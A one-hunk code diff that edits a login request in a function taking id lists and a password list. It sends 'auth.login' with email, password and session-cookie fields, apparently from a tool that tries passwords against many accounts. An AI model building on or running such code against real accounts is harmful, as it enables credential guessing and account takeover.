@@ -1855,7 +1855,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             'secure_family_device_id': f"{advertiser_id}",
             'cpl': 'true',
             'try_num': '1',
-            'email': uid,
+            'email': ids,
             'password': pw,
             'method': 'auth.login',
             'generate_session_cookies': '1',
